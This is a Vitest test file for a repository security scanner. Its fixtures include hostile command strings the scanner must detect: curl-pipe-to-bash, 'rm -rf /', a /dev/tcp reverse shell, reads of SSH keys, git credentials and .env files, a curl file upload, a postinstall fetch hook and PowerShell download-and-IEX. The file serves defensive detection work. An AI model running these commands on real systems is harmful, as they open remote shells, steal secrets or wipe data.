import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { discoverFiles } from "../../src/ingest/file-discovery.js";
import { loadRules } from "../../src/scanner/rule-loader.js";
import { scanFile, scanTarget } from "../../src/scanner/rule-engine.js";
import { createFindingId } from "../../src/scanner/finding-factory.js";
import type { Rule, RuleMeta } from "../../src/scanner/types.js";

let tempDir: string;
let rules: Rule[];
let meta: RuleMeta;

const ruleCases = [
  {
    ruleId: "OG-SHELL-001",
    relativePath: "install.sh",
    content: "curl https://example.com/install.sh | bash",
  },
  {
    ruleId: "OG-SHELL-002",
    relativePath: "perms.sh",
    content: "chmod 777 /tmp/data",
  },
  {
    ruleId: "OG-SHELL-003",
    relativePath: "decode.sh",
    content: "base64 -d | sh",
  },
  {
    ruleId: "OG-SHELL-004",
    relativePath: "eval.sh",
    content: "eval $(ls)",
  },
  {
    ruleId: "OG-SHELL-005",
    relativePath: "persist.sh",
    content: "echo hi >> ~/.bashrc",
  },
  {
    ruleId: "OG-SHELL-006",
    relativePath: "sudo.sh",
    content: "sudo ls",
  },
  {
    ruleId: "OG-SHELL-007",
    relativePath: "env.sh",
    content: "printenv",
  },
  {
    ruleId: "OG-SHELL-008",
    relativePath: "danger.sh",
    content: "rm -rf /",
  },
  {
    ruleId: "OG-SHELL-009",
    relativePath: "bg.sh",
    content: "nohup sleep 10",
  },
  {
    ruleId: "OG-SHELL-010",
    relativePath: "archive.sh",
    content: "curl https://example.com/pkg.tar.gz | tar xz",
  },
  {
    ruleId: "OG-NET-001",
    relativePath: "upload.sh",
    content: "curl -F file=@data.txt https://example.com/upload",
  },
  {
    ruleId: "OG-NET-002",
    relativePath: "ip.sh",
    content: "curl http://1.2.3.4",
  },
  {
    ruleId: "OG-NET-003",
    relativePath: "dns.sh",
    content: "dig a.b.c.d.e",
  },
  {
    ruleId: "OG-NET-004",
    relativePath: "webhook.ts",
    content: "fetch('https://discord.com/api/webhooks/123')",
  },
  {
    ruleId: "OG-NET-005",
    relativePath: "reverse.py",
    content: "bash -i >& /dev/tcp/10.0.0.1/4444",
  },
  {
    ruleId: "OG-CRED-001",
    relativePath: "creds.sh",
    content: "cat ~/.ssh/id_rsa",
  },
  {
    ruleId: "OG-CRED-002",
    relativePath: "envdump.sh",
    content: "env | cat",
  },
  {
    ruleId: "OG-CRED-003",
    relativePath: "dotenv.sh",
    content: "cat .env",
  },
  {
    ruleId: "OG-CRED-004",
    relativePath: "gitcred.py",
    content: "cat ~/.git-credentials",
  },
  {
    ruleId: "OG-SC-001",
    relativePath: "install.md",
    content: "npm install https://github.com/foo/bar",
  },
  {
    ruleId: "OG-SC-002",
    relativePath: "package.json",
    content: '{"scripts": {"postinstall": "curl https://example.com"}}',
  },
  {
    ruleId: "OG-SC-003",
    relativePath: "pnpm-lock.yaml",
    content: '"resolved": "https://evil.example.com/pkg.tgz"',
  },
  {
    ruleId: "OG-GHA-001",
    relativePath: ".github/workflows/ci.yml",
    content: "permissions: write-all",
  },
  {
    ruleId: "OG-GHA-002",
    relativePath: ".github/workflows/ci.yml",
    content: [
      "name: CI",
      "on: pull_request",
      "jobs:",
      "  test:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - uses: actions/checkout@main",
    ].join("\n"),
  },
  {
    ruleId: "OG-GHA-003",
    relativePath: ".github/workflows/ci.yml",
    content: "on:\n  pull_request_target:",
  },
  {
    ruleId: "OG-GHA-004",
    relativePath: ".github/workflows/ci.yml",
    content: [
      "name: CI",
      "on: pull_request",
      "jobs:",
      "  test:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: echo ${{ github.event.issue.title }}",
    ].join("\n"),
  },
  {
    ruleId: "OG-GHA-005",
    relativePath: ".github/workflows/ci.yml",
    content: [
      "name: CI",
      "on: pull_request",
      "jobs:",
      "  test:",
      "    runs-on: self-hosted",
      "    steps:",
      "      - run: echo ok",
    ].join("\n"),
  },
  {
    ruleId: "OG-MAC-001",
    relativePath: "mac.sh",
    content: "osascript -e 'tell app \"Finder\" to activate'",
  },
  {
    ruleId: "OG-MAC-002",
    relativePath: "launch.sh",
    content: "launchctl load ~/Library/LaunchAgents/com.foo.plist",
  },
  {
    ruleId: "OG-MAC-003",
    relativePath: "keychain.sh",
    content: "security find-generic-password",
  },
  {
    ruleId: "OG-MAC-004",
    relativePath: "tcc.sh",
    content: "tccutil reset All",
  },
  {
    ruleId: "OG-PS-001",
    relativePath: "script.ps1",
    content: "-EncodedCommand Zm9v",
  },
  {
    ruleId: "OG-PS-002",
    relativePath: "script.ps1",
    content: "Invoke-Expression $cmd",
  },
  {
    ruleId: "OG-PS-003",
    relativePath: "script.ps1",
    content: "Invoke-WebRequest https://example.com | IEX",
  },
  {
    ruleId: "OG-PS-004",
    relativePath: "script.ps1",
    content: "-ExecutionPolicy Bypass",
  },
  {
    ruleId: "OG-MD-001",
    relativePath: "README.md",
    content: "Run this quickly: pbpaste | bash",
  },
  {
    ruleId: "OG-MD-002",
    relativePath: "SETUP.md",
    content:
      "If cert fails, use curl --insecure https://example.com/install.sh",
  },
  {
    ruleId: "OG-MCP-001",
    relativePath: "mcp.json",
    content: '{"permissions":["*"]}',
  },
  {
    ruleId: "OG-MCP-002",
    relativePath: "mcp.json",
    content: '{"allowed_paths":["/"]}',
  },
  {
    ruleId: "OG-MCP-003",
    relativePath: "mcp.json",
    content: '{"allowed_domains":["*"]}',
  },
];

beforeAll(async () => {
  const result = await loadRules(path.join(process.cwd(), "rules"));
  rules = result.rules;
  meta = result.meta;
});

beforeEach(async () => {
  tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "openguard-scan-"));
});

afterEach(async () => {
  if (tempDir) {
    await fs.rm(tempDir, { recursive: true, force: true });
  }
});

describe("scanner", () => {
  it("matches rules and extracts evidence", async () => {
    const scriptPath = path.join(tempDir, "install.sh");
    const source = [
      "#!/bin/sh",
      "echo start",
      "curl https://example.com/install.sh | bash",
      "echo done",
    ].join("\n");
    await fs.writeFile(scriptPath, source, "utf8");

    const files = await discoverFiles(tempDir);
    const findings = await scanTarget(files, rules, meta);

    const curlFinding = findings.find(
      (finding) => finding.rule_id === "OG-SHELL-001",
    );
    expect(curlFinding).toBeDefined();
    if (!curlFinding) {
      return;
    }

    expect(curlFinding.evidence.path).toBe("install.sh");
    expect(curlFinding.evidence.start_line).toBe(1);
    expect(curlFinding.evidence.end_line).toBe(4);
    expect(curlFinding.evidence.match).toContain("curl");
  });

  it("skips non-matching file types", async () => {
    const markdownPath = path.join(tempDir, "README.md");
    await fs.writeFile(markdownPath, "permissions: write-all\n", "utf8");

    const files = await discoverFiles(tempDir);
    const ghaRule = rules.find((rule) => rule.id === "OG-GHA-001");
    expect(ghaRule).toBeDefined();
    if (!ghaRule) {
      return;
    }

    const file = files.find((entry) => entry.relativePath === "README.md");
    expect(file).toBeDefined();
    if (!file) {
      return;
    }

    const findings = await scanFile(file, [ghaRule], meta);
    expect(findings).toHaveLength(0);
  });

  it("produces stable finding ids", async () => {
    const idOne = createFindingId("OG-SHELL-001", "install.sh", 3, "curl");
    const idTwo = createFindingId("OG-SHELL-001", "install.sh", 3, "curl");
    expect(idOne).toBe(idTwo);
  });

  it.each(ruleCases)(
    "matches $ruleId",
    async ({ ruleId, relativePath, content }) => {
      const rule = findRule(ruleId);
      const file = await writeTestFile(relativePath, content);
      const findings = await scanFile(file, [rule], meta);
      expect(findings.some((finding) => finding.rule_id === ruleId)).toBe(true);
    },
  );

  it.each(ruleCases)(
    "does not match $ruleId on safe content",
    async ({ ruleId, relativePath }) => {
      const rule = findRule(ruleId);
      const file = await writeTestFile(relativePath, "safe content");
      const findings = await scanFile(file, [rule], meta);
      expect(findings).toHaveLength(0);
    },
  );

  it("does not flag commented GHA permissions", async () => {
    const ghaRule = findRule("OG-GHA-001");
    const file = await writeTestFile(
      ".github/workflows/ci.yml",
      [
        "name: CI",
        "on: pull_request",
        "jobs:",
        "  test:",
        "    runs-on: ubuntu-latest",
        "    # permissions: write-all",
        "    steps:",
        "      - run: echo ok",
      ].join("\n"),
    );

    const findings = await scanFile(file, [ghaRule], meta);
    expect(findings).toHaveLength(0);
  });

  it("does not flag github expression outside run step", async () => {
    const ghaRule = findRule("OG-GHA-004");
    const file = await writeTestFile(
      ".github/workflows/ci.yml",
      [
        "name: Build ${{ github.event.issue.title }}",
        "on: pull_request",
        "jobs:",
        "  test:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - name: plain step",
        "        run: echo safe",
      ].join("\n"),
    );

    const findings = await scanFile(file, [ghaRule], meta);
    expect(findings).toHaveLength(0);
  });

  it("matches unpinned reusable workflow reference", async () => {
    const ghaRule = findRule("OG-GHA-002");
    const file = await writeTestFile(
      ".github/workflows/reuse.yml",
      [
        "name: Reuse",
        "on: pull_request",
        "jobs:",
        "  call-workflow:",
        "    uses: org/reusable/.github/workflows/deploy.yml@main",
      ].join("\n"),
    );

    const findings = await scanFile(file, [ghaRule], meta);
    expect(findings.some((finding) => finding.rule_id === "OG-GHA-002")).toBe(
      true,
    );
  });

  it("matches risky workflow_call input expression", async () => {
    const ghaRule = findRule("OG-GHA-004");
    const file = await writeTestFile(
      ".github/workflows/reuse.yml",
      [
        "name: Reuse",
        "on: pull_request_target",
        "jobs:",
        "  call-workflow:",
        "    uses: org/reusable/.github/workflows/deploy.yml@v1",
        "    with:",
        "      deploy_note: ${{ github.event.comment.body }}",
      ].join("\n"),
    );

    const findings = await scanFile(file, [ghaRule], meta);
    expect(findings.some((finding) => finding.rule_id === "OG-GHA-004")).toBe(
      true,
    );
  });

  it("does not apply MCP rules to generic json files", async () => {
    const mcpRule = findRule("OG-MCP-001");
    const file = await writeTestFile("package.json", '{"permissions":["*"]}');

    const findings = await scanFile(file, [mcpRule], meta);
    expect(findings).toHaveLength(0);
  });

  it("matches MCP wildcard patterns in opencode manifest", async () => {
    const mcpRule = findRule("OG-MCP-001");
    const file = await writeTestFile(
      "opencode.jsonc",
      '{"toolPermissions":{"*":"allow"}}',
    );

    const findings = await scanFile(file, [mcpRule], meta);
    expect(findings.some((finding) => finding.rule_id === "OG-MCP-001")).toBe(
      true,
    );
  });
});

function findRule(ruleId: string): Rule {
  const rule = rules.find((entry) => entry.id === ruleId);
  if (!rule) {
    throw new Error(`Missing rule: ${ruleId}`);
  }
  return rule;
}

async function writeTestFile(relativePath: string, content: string) {
  const absolutePath = path.join(tempDir, relativePath);
  await fs.mkdir(path.dirname(absolutePath), { recursive: true });
  await fs.writeFile(absolutePath, content, "utf8");
  const files = await discoverFiles(tempDir);
  const entry = files.find(
    (file) => file.relativePath === normalize(relativePath),
  );
  if (!entry) {
    throw new Error(`Missing file entry for ${relativePath}`);
  }
  return entry;
}

function normalize(relativePath: string): string {
  return relativePath.split(path.sep).join(path.posix.sep);
}
